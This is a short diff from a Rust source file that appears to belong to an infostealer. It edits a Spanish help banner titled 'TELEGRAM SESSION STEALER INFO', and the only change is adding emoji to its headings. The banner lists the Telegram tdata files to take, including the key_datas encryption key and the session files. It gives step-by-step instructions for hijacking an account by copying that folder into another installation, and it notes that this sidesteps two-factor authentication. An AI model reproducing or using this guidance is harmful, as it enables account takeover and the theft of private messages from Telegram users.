@@ -237,23 +237,23 @@ pub fn get_telegram_info() -> String {
 ║              TELEGRAM SESSION STEALER INFO                ║
 ╚════════════════════════════════════════════════════════════╝
 
- Archivos Robados:
+📱 Archivos Robados:
    • key_datas    - Clave principal de encriptación
    • D877F783*    - Archivos de sesión
    • map*         - Mapeo de archivos
    • settings*    - Configuraciones del usuario
 
- Importancia:
+🔑 Importancia:
    El archivo key_datas es CRÍTICO - contiene la clave de
    encriptación local. Con este archivo + archivos de sesión,
    se puede acceder completamente a la cuenta de Telegram.
 
- Cómo usar:
+💡 Cómo usar:
    1. Copiar carpeta tdata completa
    2. Reemplazar en otra instalación de Telegram
    3. Abrir Telegram - sesión iniciada automáticamente
 
-  Nota:
+⚠️  Nota:
    Telegram NO requiere 2FA si tienes acceso a los archivos
    de sesión locales. La sesión permanece activa.
 "#;
